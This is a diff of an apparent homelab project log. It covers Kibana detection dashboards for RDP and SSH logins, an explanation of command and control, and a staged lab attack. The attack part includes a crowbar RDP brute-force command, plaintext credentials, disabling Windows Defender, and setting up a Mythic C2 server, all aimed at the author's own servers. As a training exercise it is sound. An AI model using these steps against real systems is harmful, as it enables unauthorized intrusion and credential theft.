@@ -396,76 +396,229 @@ system.auth.ssh.event: "Failed" AND agent.name: "Windows-Server" AND user.name: 
 
 With both rules in place, I ensured continuous monitoring of potential brute force activities across both SSH and RDP connections.
 
-### **Day 17: Creating Alerts and Dashboards in Kibana related to RDP**
-Went to maps and typed in the following query: ' event.code: "4625" and agent.name: "Windows-Server" '.
-I clicked on add layer then selected "Choropleth", and chose "World Countries" for the EMS Boundaries.
-![image](https://github.com/user-attachments/assets/c6562806-02ed-468b-8387-df35698fef68)
-I was surprised to see over 46,000 failed RDP events coming from Australia.
-I named it "RDP Failed Authentication" and saved it to the dashboard that I created earlier.
+### **Day 17: Creating Alerts and Dashboards in Kibana for RDP**
 
-I decided to create a new map with succesful RDP authentication focusing on RDP Logon type 10 abd type 7 using the following query: ' event.code: "4624" and (winlog.event_data.LogonType 7 or winlog.event_data.LogonType 10) and agent.name: "Windows-Server" '
+To monitor RDP events, I first navigated to **Maps** in Kibana and entered the following query:
+
+```bash
+event.code: 4625 and agent.name: Windows-Server
+```
+
+This query filters for failed RDP authentication attempts (`4625`), specifically targeting the `Windows-Server` machine.
+
+I added a new layer, selected **Choropleth**, and chose **World Countries** for the EMS Boundaries.
+
+![image](https://github.com/user-attachments/assets/c6562806-02ed-468b-8387-df35698fef68)
+
+Upon visualizing the data, I discovered over **46,000 failed RDP authentication attempts** originating from Australia. I named the map **"RDP Failed Authentication"** and saved it to the dashboard I had created earlier.
+
+Next, I focused on successful RDP authentications by creating a new map. I used this query to track **RDP Logon Types 10 and 7** (indicating successful remote logins):
+
+```bash
+event.code: 4624 and (winlog.event_data.LogonType: 7 or winlog.event_data.LogonType: 10) and agent.name: Windows-Server
+```
+
 ![image](https://github.com/user-attachments/assets/0c563f01-8047-40a8-a83f-7b496aee8c93)
 
-I went to discover and create a field that showerd the timestamp,country nae, source Ip , and username
+I then went to **Discover** and created a field displaying the timestamp, country name, source IP, and username:
+
 ![image](https://github.com/user-attachments/assets/e3168441-a29d-4969-972d-e1fd45f4d26f)
 
-I clicked on create visualization and I pasted in the failed SSH query. I added the following values to be displayed: username, country name, source IP.
-I sorted the count of records to descending. I saved it and named it "SSH Failed Authentications [Table]". I duplicated it and created a table to show successful SSH authentications.
-<img width="1271" alt="image" src="https://github.com/user-attachments/assets/2e9868ff-3fa7-446d-930b-8f819e0f65af">
-I did the same thing for the RDP Authentications
-<img width="1505" alt="image" src="https://github.com/user-attachments/assets/d05fb258-dace-40b1-83bd-31d2623d0336">
+After that, I clicked on **Create Visualization** and pasted the **Failed SSH query**:
 
-### **Day 18: Command and Control**
-The MITRE ATT&CK framework explains that a C2 is what the adversary uses to try and communicate with compromised systems to control them. Is when an attacker would have access to a victim's computer to perfom the actions they want to help them meet their actions and objectives.
-C2 usually involves two objectives: The command center- server or network location controlled by the attacker, and the compromised systems- the devices that have been infected with malware, allowing them to communicate with the command center.
+```bash
+event.code: 4625 and agent.name: Windows-Server
+```
+
+I added the following fields to be displayed: `username`, `country name`, and `source IP`. I sorted the count of records in descending order, saved it, and named it `SSH Failed Authentications [Table]`. I duplicated this and created a similar table for successful SSH authentications.
+
+![image](https://github.com/user-attachments/assets/2e9868ff-3fa7-446d-930b-8f819e0f65af)
+
+Finally, I replicated the same process for **RDP Authentications**:
+
+![image](https://github.com/user-attachments/assets/d05fb258-dace-40b1-83bd-31d2623d0336)
+
+
+### **Day 18: Command and Control (C2)**
+
+In the **MITRE ATT&CK** framework, a **Command and Control (C2)** refers to the mechanism that adversaries use to communicate with compromised systems in order to control them. Essentially, it’s how attackers maintain control over victim machines once they’ve gained access. The C2 infrastructure allows them to issue commands and receive data from compromised devices, helping attackers achieve their goals and objectives.
+
+A **C2** setup typically has two key components:
+
+1. **The Command Center**: This is usually a server or a network location controlled by the attacker. It acts as the hub for sending instructions to compromised systems and receiving feedback or exfiltrated data. In more sophisticated attacks, the command center may be hidden behind multiple layers of obfuscation, making it difficult for defenders to trace.
+
+2. **Compromised Systems**: These are the devices infected with malware, granting the attacker persistent access. Once compromised, these systems establish a connection to the command center, allowing the attacker to issue commands, download or upload files, and execute various malicious tasks remotely.
+
+In practical terms, a C2 server gives an attacker full control over a victim’s machine, enabling actions like data exfiltration, keylogging, and remote execution of commands. This kind of infrastructure is crucial for many stages of a cyberattack, including maintaining persistence, lateral movement, and data collection.
+
+In summary, a C2 is the lifeline between the attacker and the compromised systems, allowing them to perform malicious activities while remaining in control of their operation.
 
 ### **Day 19: Creating an Attack Diagram**
-Phase 1: Initial Access- Perform a Brute Force attack against the Windows server until we get a successful authentication 
-![image](https://github.com/user-attachments/assets/d0bee4a2-2707-4fad-a066-8fca9445a5f7)
-Phase 2: Discovery- Perform Discovery commands like whoami, ipconfig, net user, and net group
-![image](https://github.com/user-attachments/assets/388ca39b-099e-415d-956e-59fecdc7da8e)
-Phase 3: Defense Evasion- With an RDP established session, we will disable Windows Defender on the Windows server. 
-![image](https://github.com/user-attachments/assets/9bd6cc27-0dfc-45c9-ae8f-fcea56dd3b4d)
-Phase 4: Execution- We will use PowerShell Invoke Expression to download Mythic Agent on our C2 server. Once it is downloaded, we will execute it
-![image](https://github.com/user-attachments/assets/ee01f372-9af1-4ec3-a18a-0b1b699c17f3)
-Phase 5: Command & Control
-![image](https://github.com/user-attachments/assets/62f8d804-e550-4d30-994c-e5d6d979c8dd)
-Phase 6: Exfiltration. We will use the C2 server to download the passwords file off the Windows server
-![image](https://github.com/user-attachments/assets/5efbfc42-90ba-4820-9c6b-5b629a4f6791)
 
-### **Day 20: Mythic Server setup**
-On VULTR, I clicked on deploy new server and then "cloud compute- Shared CPU". For the OS I selceted Ubuntu 22.04, It is recommended to run Mythic on a machine with atleast 2CPus and 4GBs of RAM. I named the server "Mythic C2". I logged into my Kali VM and SSHed into the Mythic server.
-First thing I did was updated and upgraded the repositories. I installed docker: "apt install docker-compose", then I confirmed that make was already installed on the machine. I cloned the mythic git repository: "git clone https://github.com/its-a-feature/Mythic"
-I navigated into the Mythic direcotry and ran: "./install_docker_ubuntu.sh"
-![image](https://github.com/user-attachments/assets/2e7a4c05-3620-4ee5-b2f8-a41e5eec5dfa)
-I then ran the command make. I got an error so I checked to see if docker was running using the cmd: "systemctl status docker" and saw that docker wasn't active. I restarted docker: "systemctl restart docker". I confirmed that docker was now active.
-I typed in make again and started the mythic cli: "./mythic-cli start"
-I went back to VULTR and created a firewall to only allow my computer to connect to the Mythic server. I also added the Windows Server and the Ubuntu Server to also be able to connect to the Mythic Server.
-To login to Mythic, I copied the Mythic's server public IP and added port 7443, and https: "https://149.28.88.178:7443".
-By default the username is "mythic_admin".
-For the password I went to linux terminal and typed in "ls -la" to see all the files including the hidden ones. I was looking for the ".env" file which has all the mythic configuration details.
-I was looking for the admin password so I ran the cmd: "cat .env | grep ADMIN"
-![image](https://github.com/user-attachments/assets/c583a4b3-6a57-4766-b256-e3db76049455)
+**Phase 1: Initial Access**  
+In this phase, we will perform a brute force attack against the **Windows Server** until we achieve a successful authentication.  
+![Initial Access](https://github.com/user-attachments/assets/d0bee4a2-2707-4fad-a066-8fca9445a5f7)
 
-### **Day 21: Mythic Agent setup**
-I opened up my Windows document and created a text file named passwords under the documents folder. In the passwords file I typed in "Winter2024!" which is the new password to my Windows Server.
-I opened my VM in Kali Linux and navigated to "/usr/share/wordlists". I then typed in the command "sudo ginzip rockyou.txt.gz" to unzip "rockyou". I then ran the cmd: "cat rockyou.txt".
-The password list was large so I typed in "head -50 rockyou.txt > home/user/user-wordlist.txt".
-I navigated to home and then typed in: "cat the user-wordlist.txt"
-![image](https://github.com/user-attachments/assets/49ca6e98-cf05-4289-b701-f563f9fd9042)
-I opened the wordlist and add the bottom I added in the windows Server password- "Winter2024!"
-Next I installed crowbar with command: "sudo apt-get install -y crowbar"
-I got an error. I update my repositories with: "sudo apt-get update && sudo apt-get upgrade -y"
-I ran the command to install crowbar agian and this time it successfully installed.
-I used nano to open a new file named "target.txt" and in there I put my Windows Server ip address and the username.
-I ran the cmd: "crowbar -b rdp -u Administrator -C username-wordlist.txt -s 45.63.57.62/32"  crowbar specifies to use the crowbar service, -b specifies the rdp service, -u is the user account, -C is the wordlist containg the a bunch of different passwords that I want to try and authenticate with, -s is for the target ip address. I used a /32 notation because I only want to target the one IP address.
-Within 7seconds it was able to gain access into the target machine.
-![image](https://github.com/user-attachments/assets/d54d7edc-604c-4aab-847a-a5e4c84af676)
-I used the xfreerdp service to rdp into the machine using the command: "xfreerdp /u:Administrator /p:Winter2024! /v:45.63.57.62:3389" and I was able to rdp into the Windows Server using my Kali Linux VM:
-![image](https://github.com/user-attachments/assets/fe66748f-bbb3-4114-8e2d-9b20e2358caf)
-I opened the command Prompt and typed in "net user Administrator" to see what type of groups the account was added to.
-I went to settings and disabled windows defender.
-I then SShd into the Mythic Server
+**Phase 2: Discovery**  
+Next, we will execute discovery commands such as `whoami`, `ipconfig`, `net user`, and `net group` to gather information about the system and its users.  
+![Discovery](https://github.com/user-attachments/assets/388ca39b-099e-415d-956e-59fecdc7da8e)
+
+**Phase 3: Defense Evasion**  
+Once we have established an **RDP** session, we will disable **Windows Defender** on the **Windows Server** to avoid detection during our subsequent actions.  
+![Defense Evasion](https://github.com/user-attachments/assets/9bd6cc27-0dfc-45c9-ae8f-fcea56dd3b4d)
+
+**Phase 4: Execution**  
+In this phase, we will use **PowerShell's** `Invoke-Expression` command to download the **Mythic Agent** onto our **C2 Server**. After the download is complete, we will execute the agent.  
+![Execution](https://github.com/user-attachments/assets/ee01f372-9af1-4ec3-a18a-0b1b699c17f3)
+
+**Phase 5: Command & Control (C2)**  
+At this stage, we will establish a communication link between the compromised **Windows Server** and our **C2 Server**, allowing us to send commands and receive data.  
+![Command & Control](https://github.com/user-attachments/assets/62f8d804-e550-4d30-994c-e5d6d979c8dd)
+
+**Phase 6: Exfiltration**  
+Finally, we will utilize the **C2 Server** to download the passwords file from the **Windows Server**, completing the attack sequence.  
+![Exfiltration](https://github.com/user-attachments/assets/5efbfc42-90ba-4820-9c6b-5b629a4f6791)
+
+### **Day 20: Mythic Server Setup**
+
+On **VULTR**, I initiated the process by deploying a new server, selecting **"Cloud Compute - Shared CPU"** as the option. For the operating system, I chose **Ubuntu 22.04**, which is recommended for running **Mythic**. It’s advisable to use a machine with at least `2 CPUs` and `4GB` of RAM for optimal performance. I named the server **"Mythic C2"**.
+
+After deploying, I logged into my **Kali VM** and established an SSH connection to the **Mythic server**. The first step was to update and upgrade the package repositories. Then, I installed **Docker** using the command:
+
+```bash
+apt install docker-compose
+```
+
+I confirmed that **Make** was already installed on the machine. Next, I cloned the **Mythic** Git repository with the following command:
+
+```bash
+git clone https://github.com/its-a-feature/Mythic
+```
+
+Once cloned, I navigated into the **Mythic** directory and executed:
+
+```bash
+./install_docker_ubuntu.sh
+```
+![Mythic Installation](https://github.com/user-attachments/assets/2e7a4c05-3620-4ee5-b2f8-a41e5eec5dfa)
+
+Following this, I ran the command `make`. However, I encountered an error. To troubleshoot, I checked if **Docker** was running with:
+
+```bash
+systemctl status docker
+```
+
+I found that **Docker** was not active, so I restarted it with:
+
+```bash
+systemctl restart docker
+```
+
+After confirming that **Docker** was now active, I typed `make` again and then started the **Mythic CLI** with:
+
+```bash
+./mythic-cli start
+```
+
+Next, I returned to **VULTR** to create a firewall rule that would only allow my computer to connect to the **Mythic server**. I also added the **Windows Server** and **Ubuntu Server** to the allowed connections list for the **Mythic Server**.
+
+To log into **Mythic**, I copied the server's public IP and appended port `7443` with `https`:
+
+```
+https://149.28.88.178:7443
+```
+
+By default, the username is `mythic_admin`. To find the password, I opened the Linux terminal and used the command:
+
+```bash
+ls -la
+```
+
+This command helped me locate the hidden files, specifically the `.env` file, which contains all the **Mythic** configuration details. To extract the admin password, I ran:
+
+```bash
+cat .env | grep ADMIN
+```
+![Admin Password Extraction](https://github.com/user-attachments/assets/c583a4b3-6a57-4766-b256-e3db76049455)
+
+### **Day 21: Mythic Agent Setup**
+
+I began by creating a text file named `passwords` in the **Documents** folder on my **Windows** machine. In this file, I entered the new password for my **Windows Server**: 
+`Winter2024!`
+
+Next, I opened my **Kali Linux** VM and navigated to the directory `/usr/share/wordlists`. I unzipped the `rockyou` password list with the following command:
+
+```bash
+sudo gunzip rockyou.txt.gz
+```
+
+After unzipping, I viewed the contents of the `rockyou.txt` file by running:
+
+```bash
+cat rockyou.txt
+```
+
+Since the password list was quite large, I decided to extract the first 50 entries and save them to a new file called `user-wordlist.txt`:
+
+```bash
+head -50 rockyou.txt > /home/user/user-wordlist.txt
+```
+
+I then navigated to the home directory and confirmed the contents of `user-wordlist.txt`:
+
+```bash
+cat /home/user/user-wordlist.txt
+```
+![Wordlist Preview](https://github.com/user-attachments/assets/49ca6e98-cf05-4289-b701-f563f9fd9042)
+
+At the bottom of the file, I added my **Windows Server** password, `Winter2024!`.
+
+Next, I installed **Crowbar** using the command:
+
+```bash
+sudo apt-get install -y crowbar
+```
+
+I encountered an error during the installation, so I updated my package repositories:
+
+```bash
+sudo apt-get update && sudo apt-get upgrade -y
+```
+
+After the update, I ran the command to install **Crowbar** again, and this time it was successful.
+
+I created a new file named `target.txt` using **nano**, where I included my **Windows Server** IP address and the username. To perform the brute-force attack, I executed the following command:
+
+```bash
+crowbar -b rdp -u Administrator -C /home/user/user-wordlist.txt -s 45.63.57.62/32
+```
+
+In this command:
+- `crowbar` specifies the use of the **Crowbar** service.
+- `-b rdp` indicates the protocol being targeted (Remote Desktop Protocol).
+- `-u Administrator` specifies the user account.
+- `-C /home/user/user-wordlist.txt` points to the wordlist containing the passwords I want to try for authentication.
+- `-s 45.63.57.62/32` indicates the target IP address using `/32` notation to target only that specific address.
+
+Within just 7 seconds, I successfully gained access to the target machine!
+![Access Gained](https://github.com/user-attachments/assets/d54d7edc-604c-4aab-847a-a5e4c84af676)
+
+To connect to the **Windows Server** via **Remote Desktop**, I used the **xfreerdp** service with the following command:
+
+```bash
+xfreerdp /u:Administrator /p:Winter2024! /v:45.63.57.62:3389
+```
+
+This command allowed me to RDP into the **Windows Server** using my **Kali Linux VM**:
+![RDP Access](https://github.com/user-attachments/assets/fe66748f-bbb3-4114-8e2d-9b20e2358caf)
+
+Once logged in, I opened the **Command Prompt** and executed:
+
+```bash
+net user Administrator
+```
+
+This command allowed me to see which groups the Administrator account was a member of. I also went into the **Settings** and disabled **Windows Defender**. Finally, I established an SSH connection into the **Mythic Server**.
 
 
 
